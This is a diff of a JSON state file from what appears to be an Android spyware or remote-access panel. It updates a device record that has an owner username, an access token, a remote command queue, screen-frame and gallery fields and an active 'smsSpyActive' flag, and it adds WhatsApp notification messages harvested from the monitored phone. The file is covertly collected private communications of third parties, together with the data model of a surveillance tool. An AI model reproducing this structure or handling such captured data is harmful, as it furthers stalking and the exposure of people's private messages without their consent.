@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776959392141,
+    "lastSeen": 1776959395402,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Oi (12 pesan): BEW STORE",
+        "content": "• Example : capcut https://www.capcut.com/watch/7178705274797067521?use_new_ui=0&template_id=7178705274797067521&share_token=66f8a56d-93a8-4339-a46f-795a2416809c&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1\n\n> https://whatsapp.com/channel/0029Vb610enId7nWJHmxu118",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959396514
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎72 pesan dari 41 chat",
+        "time": "23/04 23:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776959394507
+      },
       {
         "appName": "WhatsApp",
         "sender": "Oi: Nakan",
@@ -4003,22 +4019,6 @@
         "time": "23/04 21:42",
         "pkg": "com.whatsapp",
         "receivedAt": 1776951754946
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "oalah oke siap kak",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951754926
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎73 pesan dari 42 chat",
-        "time": "23/04 21:42",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776951754622
       }
     ],
     "galleryPhotos": [],
